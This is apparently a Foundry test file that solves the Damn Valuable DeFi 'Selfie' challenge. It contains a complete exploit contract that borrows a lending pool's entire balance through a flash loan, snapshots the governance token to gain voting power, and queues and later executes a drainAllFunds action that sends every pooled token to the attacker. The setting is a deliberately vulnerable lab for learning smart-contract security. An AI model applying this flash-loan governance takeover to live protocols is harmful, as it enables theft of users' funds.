// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploitSelfie() public {
        /**
         * EXPLOIT START *
         */
  vm.startPrank(attacker);

    // Deploy the exploit contract
    SelfieExploit exploit = new SelfieExploit(
        address(selfiePool),
        address(simpleGovernance),
        address(dvtSnapshot),
        attacker
    );

    // Perform the flash loan attack
    exploit.attack();

    // Fast forward 2 days
    vm.warp(block.timestamp + 2 days);

    // Execute the drainAllFunds action
    exploit.executeAction();

    vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}


contract SelfieExploit {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableTokenSnapshot private immutable token;
    address private immutable attacker;
    uint256 public actionId;

    constructor(address _pool, address _governance, address _token, address _attacker) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        attacker = _attacker;
    }

    function attack() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Caller must be pool");
        
        // Take a snapshot
        token.snapshot();
        
        // Queue the drainAllFunds action
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(pool), data, 0);
        
        // Return the tokens
        token.transfer(address(pool), amount);
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}